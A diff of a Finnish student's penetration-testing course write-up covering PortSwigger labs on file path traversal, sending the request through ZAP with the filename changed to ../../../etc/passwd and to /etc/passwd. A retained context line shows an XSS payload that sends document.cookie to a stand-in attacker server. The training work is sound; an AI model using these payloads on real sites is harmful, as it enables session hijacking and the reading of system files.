@@ -79,6 +79,28 @@ fetch('https://hyökkääjän-palvelin.com/varastettu?data=' + document.cookie)
 saisi hyökkääjä uhrin istuntoevästeet ja pääsisi kirjautumaan uhrina sivustolle ilman tunnuksia.  
 
 ## f) Lab: File path traversal, simple case  
+Avasin labissa tuotesivun ja ZAP:issa näkyi kuvan tiedostonimi.  
+<img width="344" height="36" alt="image" src="https://github.com/user-attachments/assets/eb12b273-8286-40c3-9ed3-ac4122da41e7" />  
+Löysin ZAP:ista GET pyynnön tälle kuvalle.  
+<img width="1670" height="34" alt="image" src="https://github.com/user-attachments/assets/8fa14435-8ae9-4cab-87d5-598e7061018b" />  
+Klikkasin kohtaa hiiren oikealla ja avasin "Open/Resend with Request Editor"  
+<img width="799" height="599" alt="image" src="https://github.com/user-attachments/assets/116ad941-d440-4a99-a921-8e84612893f1" />  
+Vaihtamalla tiedostonimen 51:stä -> ../../../etc/passwd, ja lähettämällä hakupyynnön uudestaan, sivun pitäisi hakea passwd tiedosto. Painoin Send.  
+<img width="480" height="205" alt="image" src="https://github.com/user-attachments/assets/7e40a7a6-a6ca-4cd3-9ff4-a58e87761e05" />  
+<img width="1067" height="275" alt="image" src="https://github.com/user-attachments/assets/bd19a198-e5eb-4aa9-bff8-e0f021b8eadc" />  
+(PortSwigger. Lab: File path traversal, simple case.)  
+
+## g) Lab: File path traversal, traversal sequences blocked with absolute path bypass  
+Tässä labissa sivusto estää ../ sekvenssit. Tämän pitäisi pystyä ohittamaan absoluuttisella polulla.  
+Aloitin samalla tavalla hakemalla tuotekuvan ja tutkimalla sitä ZAP:issa. PortSwigger sivuston mukaan tämän pitäisi toimia samalla tavalla kuin edelline, mutta laitetaan hakupyynnössä tiedostonimeksi absoluuttinen polku tiedostoon.  
+Vaihetaan filename=30,jpg /etc/passwd.  
+<img width="793" height="424" alt="image" src="https://github.com/user-attachments/assets/e1b2c157-0af9-47f5-b0e2-05047199e50b" />  
+<img width="778" height="42" alt="image" src="https://github.com/user-attachments/assets/d1de5345-e55b-4ede-a83f-4bf0c6376023" />  
+<img width="463" height="205" alt="image" src="https://github.com/user-attachments/assets/99a9989a-37e5-4038-905a-4b90814c85e8" />  
+<img width="1188" height="201" alt="image" src="https://github.com/user-attachments/assets/1fcb398f-2be6-43ab-af2f-ab001bc69463" />  
+
+
+
 
 
 
@@ -91,5 +113,6 @@ PortSwigger. Cross-site scripting. https://portswigger.net/web-security/cross-si
 PortSwigger. Cross-site scripting. https://portswigger.net/web-security/all-labs#cross-site-scripting  
 PortSwigger. Lab: Reflected XSS into HTML context with nothing encoded. https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded  
 PortSwigger. Lab: Stored XSS into HTML context with nothing encoded. https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded  
+PortSwigger. Lab: File path traversal, simple case. https://portswigger.net/web-security/file-path-traversal/lab-simple  
 Karvinen, Tero. 2026. Tunkeutumistestaus. https://terokarvinen.com/tunkeutumistestaus/  
 Mozilla. https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/
